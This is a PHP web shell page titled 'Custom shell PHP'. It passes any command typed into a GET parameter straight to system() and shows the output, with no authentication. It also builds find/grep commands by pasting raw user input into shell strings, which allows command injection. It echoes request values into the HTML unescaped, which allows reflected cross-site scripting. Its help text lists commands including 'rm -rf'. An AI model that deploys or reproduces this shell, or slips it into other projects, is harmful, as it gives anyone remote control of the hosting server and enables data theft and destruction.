<!DOCTYPE html>
<html>
<head>
<title>ThanhDN - Custom shell PHP</title>
</head>
<body>
<form>
<fieldset>
<legend>Linux/shell:</legend>
Root:<br>
<input type="text" name="root" value="<?php echo $_GET["root"] ?>"><br>
File name:<br>
<input type="text" name="name" value="<?php echo $_GET["name"] ?>"><br>
String:<br>
<input type="text" name="string" value="<?php echo $_GET["string"] ?>"><br>
Command:<br>
<textarea name="command" rows="4" cols="100"><?php echo $_GET["command"] ?></textarea><br>
- Find edit files: find ./ -type f -mmin -30<br>
- Find by name: find ./ -name "abc*"<br>
- Find by string: find . | xargs grep 'word' -sl<br>
- Delete folder: rm -rf "folder name"<br>
- Zip: zip -r "zip file name" "folder name"/ ex: zip -r cbet-production.zip cbet/<br>
- Unzip: unzip "zip file name" ex: unzip cbet-production.zip<br>
<input type="submit" value="Submit">
<a href="shell.php">Reset</a>
</fieldset>
</form>
<fieldset>
<legend>Linux/result:</legend>
<div style="color:red;">
<?php
if (isset($_GET["command"]) && $_GET["command"]!='')
{
	$cmd = $_GET["command"];
}
else
{
	if (isset($_GET["name"]) || isset($_GET["string"])) 
	{
		$cmd = 'find ./'.$_GET["root"];
	}
		
	if (isset($_GET["name"]) && $_GET["name"]!='')
	{
		$cmd =$cmd. " -name '".$_GET["name"]."*'";
	}
	if (isset($_GET["string"]) && $_GET["string"]!='')
	{
		$cmd =$cmd. " | xargs grep '".$_GET["string"]."' -sl";
	}

}
if (isset($cmd))
{
	echo '<pre>';
	$last_line = system($cmd, $retval);
	echo '</pre><hr />Last line of the output: ' . $last_line . '<hr />Return value: ' . $retval. '<hr />Command: ' . $cmd;
}
?>
</div>
</fieldset>
</body>
</html>
